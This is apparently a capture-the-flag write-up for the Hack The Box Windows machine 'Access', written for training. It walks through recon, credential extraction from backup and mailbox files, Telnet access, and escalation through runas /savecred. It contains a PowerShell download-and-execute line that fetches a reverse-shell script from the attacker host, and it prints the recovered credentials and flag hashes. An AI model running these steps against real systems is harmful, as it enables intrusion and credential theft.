# HTB: Access

**Operating System:** Windows
**Difficulty:** Easy
**Date of Engagement:** 2025-09-16

---

## Engagement Overview

**Target IP:** 10.10.10.98
**Local IP:** 10.10.14.3

**Objective:** Enumerate services, recover credentials from backups/mail archives, obtain a low-privilege shell, escalate to Administrator, capture `user.txt` and `root.txt`. Source steps and logs are from your notes and collected artifacts.

---

## Reconnaissance

### Nmap
```
sudo nmap -sC -sV -T5 -oA logs/nmap 10.10.10.98
```

**Relevant output (condensed):**

- 21/tcp open  ftp (Microsoft ftpd) 
- 23/tcp open  telnet
- 80/tcp open  http (Microsoft IIS 7.5)

### Web / content discovery
- Gobuster attempts produced timeouts; web root returned mostly images but FTP/weblisting revealed backup artifacts.

### Discovered artifacts
- `Backups/backup.mdb`
- `Engineer/Access Control.pst`
- `Engineer/Access Control.zip`

---

## Initial Access — Extracted Credentials

From `backup.mdb` and exported tables:
- `engineer` : `access4u@security` (auth_user table)
- Used to extract `Access Control.pst` from `Access Control.zip`

From `Access Control.pst` (email content):
- `security` : `4Cc3ssC0ntr0ller`.

*(These credentials were located using `strings`, `mdbtools` and `readpst` .)*

---

## Methodology & Tools

**Primary methodology:**  

1. Service enumeration (`nmap`).
2. Locate and download backup artifacts (MDB, PST/MBX, ZIP).
3. Extract text from artifacts (`strings`, `mdbtools`, `readpst`) to find credentials.
4. Authenticate to exposed services (Telnet) to obtain a user shell.
5. Abuse a discovered `.lnk` referencing `runas /savecred` to run a remote PowerShell payload as Administrator.
6. Capture flags and document steps.

**Tools:** `nmap`, `gobuster` (attempted), `strings`, `mdbtools` (`mdb-tables`, `mdb-export`), `pst-utils`/`readpst`, `telnet`, `nc` (netcat), `runas`, and a Nishang PowerShell one-liner (hosted on attacker box).

---

## Reproducible Steps & Commands

### Recon & artifact download
```bash
sudo nmap -sC -sV -T5 -oA logs/nmap 10.10.10.98
# after finding web/ftp listings, download:
# 10.10.10.98/Backups/backup.mdb
# 10.10.10.98/Engineer/Access Control.zip
```

### Artifact inspection & credential harvesting
```bash
# quick string search
strings 10.10.10.98/Backups/backup.mdb | grep -C3 access

# mdbtools (export auth_user)
mdb-tables backup.mdb
mdb-export backup.mdb auth_user

# PST -> MBOX
7z x "Access Control.zip"
readpst "Access Control.pst"
less "Access Control.mbox"
```

**Recovered credentials (used):**
- `engineer:access4u@security` (from `backup.mdb`).
- `security:4Cc3ssC0ntr0ller` (from PST/mbox email). 

### Use credentials to access Telnet
```bash
telnet 10.10.10.98
# login: security
# password: 4Cc3ssC0ntr0ller

# verify shell and user flag
whoami        # access\security
type C:\Users\security\Desktop\user.txt
```

**User flag captured:** `cb237095f1d0b24079794fa1a2932c1b`. 

### Privilege escalation via runas / saved creds
- Found a desktop `.lnk` referencing `runas.exe` with `ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"`. The LNK contained the `runas` invocation.

Example trigger used (hosted Nishang one-liner; attacker listener on port 443):
```powershell
# on attacker: listener
nc -lnvp 443

# on target: trigger runas to download+execute Nashang one-liner
runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.3/shell.ps1')"
```

Reverse shell received as Administrator; `root.txt` retrieved.

**Root flag captured:** `bc97e19e6897f692e5272f63e763a3a8`. fileciteturn1file0

---

## Privilege Escalation — Notes
- Escalation relied on misconfigured saved-credential usage triggered via a `.lnk` referencing `runas /savecred`. No kernel exploit required.

---

## Key Takeaways & Remediation
1. **Protect backup artifacts and mailbox exports** — encrypt backups and restrict access. 
2. **Remove/replace legacy services** — avoid Telnet/anonymous FTP; use secure alternatives. 
3. **Avoid saved-credential patterns** — `runas /savecred` and shortcuts referencing privileged accounts must be audited/removed.
4. **Monitor for remote PowerShell downloads and runas invocations** — host/IDS rules can detect similar abuse.

